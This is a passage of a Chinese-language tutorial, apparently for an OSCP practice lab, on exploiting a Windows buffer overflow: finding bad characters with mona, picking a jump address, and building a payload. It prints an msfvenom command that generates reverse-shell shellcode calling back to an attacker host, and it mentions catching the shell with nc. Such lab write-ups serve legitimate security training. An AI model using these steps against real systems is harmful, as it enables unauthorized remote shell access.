# **0x03:寻找坏字符串**

由于我们后面生成反弹shell是通过shellcode进行编码的，但是程序可能会对某些编码表示不认可，这就是坏字符串，我们得把它们找出来。这里得注意一波，每个程序对坏字符串会有不同的定义，比如这个程序可能会觉得\\x00 \\x01\\x02是坏字符串，另外一个程序可能会觉得\\xff是坏字符串。坏字符串基本上是没有固定的，除了\\x00。

  

这里得先用mona通知一波\\x00是坏字符串

![](../Images/2790ba7048fc10097aeb2ae47d0be724.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

这里的思路是先通过网页的py脚本生成\\x01到\\xff字符串，然后慢慢调试找出坏字符串除了。

![](../Images/ac9b2327ca8ea811a2c96f3ce15d2f0c.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

把生成好的一堆字符串复制到github脚本里面的bad变量里面，稍微修改下IP和关卡名。就可运行了。

![](../Images/55a879a075e822f21d227e4ba8506de4.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

运行完py脚本以后此时的Immunity Debugger应该是停止状态。在底层输入框输入!mona compare -f C:\\mona\\oscp\\bytearray.bin -a ESP地址 会弹出一个比较结果并列出有可能的坏字符串出来。

![](../Images/fb28795265a0ce371c28b0c318a1535d.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

这里建议两个两个进行比较，比如说23 和24，在刚才的脚本中把23给删了，此时24消失了。

![](../Images/7f31b52ab7d2cc0b65ad5748e527d7bd.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

而把24给删了，23，24两个都还在，内鬼是23它连累到后面的24字符串上坏字符串榜了。

![](../Images/ed3181d508418173ee3b93872c734e65.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

用这种方法慢慢推，最后用纸记录了一波。最后的坏字符串就是23 3c 83 和ba

![](../Images/cb5e22bf59d94cfd4b9ee92507749545.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

找完以后用!mona bytearray -b “\\x00\\x23\\x3c\\x83\\xba”通知一波。

![](../Images/7baa29817243c3318897da8a04fe3a8a.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

把那些坏字符串给删掉。重新运行一波。

![](../Images/c844100973782adade1f225f58b3589d.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

此时再比较一波已经变成unmodifed了，意思是没坏字符串了。

![](../Images/308789a3c8f6d7d9d8e7f786e7be3dcf.png)

  

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

接下来，就是查找波跳跃点，用!mona命令以后可以找出很多跳跃点，这里我选择最头顶的这个。

![](../Images/c7de325d77a7ddc8583aed0ef8a198bd.png)

  

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

然后把它写入到retn变量里面反着来写，并且按照\\x xx这种格式。

![](../Images/ab5e1fbc1da94e06762253798548473a.png)

  

# **0x04:生成最终payload**

最重要的就是生成反弹shell了可以用这条命令

msfvenom -p windows/shell\_reverse\_tcp LHOST=YOUR\_IP LPORT=4444 EXITFUNC=thread -b "\\x00\\x23\\x3c\\x83\\xba" -f c

![](../Images/ac6c8485f0ef4120185e4ebf49ceb949.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

把刚才生成好的一堆shellcode复制到payload变量里面，这里在提一下我们的shellcode是需要一定空间解压的所以在padding 这个变量里面我们指定16个\\x90

![](../Images/455fee280b92048512125e49eeac64c8.png)

  

![](../Images/7538deb9c7414fc05a0d45627f7edbb3.png)

  

  

最后提前开启nc，重新运行最终payload，成功得到一个反弹shell

![](../Images/e6637e8f5b1182a479107635d42faa8b.png)
